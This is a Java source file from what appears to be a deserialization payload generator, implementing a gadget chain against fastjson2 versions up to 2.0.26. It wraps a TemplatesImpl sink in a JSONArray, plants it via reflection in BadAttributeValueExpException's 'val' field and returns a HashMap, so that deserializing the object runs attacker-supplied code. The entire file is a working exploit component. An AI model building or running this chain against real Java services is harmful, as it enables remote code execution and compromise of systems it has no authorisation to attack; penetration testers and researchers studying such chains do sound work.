package com.ppp.chain.json;

import com.alibaba.fastjson2.JSONArray;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

/**
 * @author Whoopsunix
 */
@Dependencies({"com.alibaba:fastjson2:<=2.0.26"})
@Authors({Authors.Y4tacker})
@Sink({Sink.TemplatesImpl})
public class FastJson2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(FastJson2.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object o = WrapSerialization.scheduler(sinkObject, sinksHelper);
            sinkObject = (o != null) ? o : sinkObject;
        }

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(bd, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates, bd);
        return hashMap;
    }
}
